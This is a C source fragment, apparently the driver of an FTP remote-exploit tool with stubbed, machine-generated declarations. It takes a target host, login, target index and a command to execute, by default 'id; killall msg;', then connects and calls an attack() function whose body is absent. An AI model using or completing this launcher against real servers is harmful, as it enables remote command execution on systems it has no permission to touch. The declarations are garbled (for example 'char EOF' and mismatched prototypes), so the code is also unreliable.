
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 char EOF ;
 int atoi (char*) ;
 int attack (int,char*,char*,int,char*) ;
 int close (int) ;
 int connectserver (int*,char*,int) ;
 int fprintf (int ,char*,char*,int,char*,char*) ;
 char getopt (int,char**,char*) ;
 int helpme (int,char**) ;
 char* optarg ;
 int sscanf (char*,char*,char*,int*) ;
 int stderr ;
 int strcmp (char*,char*) ;
 int strcpy (char*,char*) ;

int main(int argc, char **argv) {
char optchar, *exec = ((void*)0), server[512] = "", *username = ((void*)0), *password = ((void*)0);
int s, retval = -1, port, target = 0;

if (argc < 2) {
helpme(argc, argv);
} else {
while ( (optchar = getopt(argc, argv, "h:t:u:p:e:")) != EOF ) {
switch(optchar) {
case 'h': sscanf(optarg, "%[^:]:%d", server, &port);
break;
case 'u': username = optarg;
break;
case 'p': password = optarg;
break;
case 't': target = atoi(optarg);
break;
case 'e': exec = optarg;
break;
}
}

if (!strcmp(server, "")) {
strcpy(server, "127.0.0.1");
port = 21;
}

if (!username) {
username = "anonymous";
}

if (!password) {
password = "freak@kaefig.com";
}

if (!exec) {
exec = "id; killall msg; ";
}

fprintf(stderr, "[*] connecting %s:%d (%s/%s)...\n", server, port, username, password);
if (!connectserver(&s, server, port)) {
retval = attack(s, username, password, target, exec);
close(s);
}
}

return retval;
}
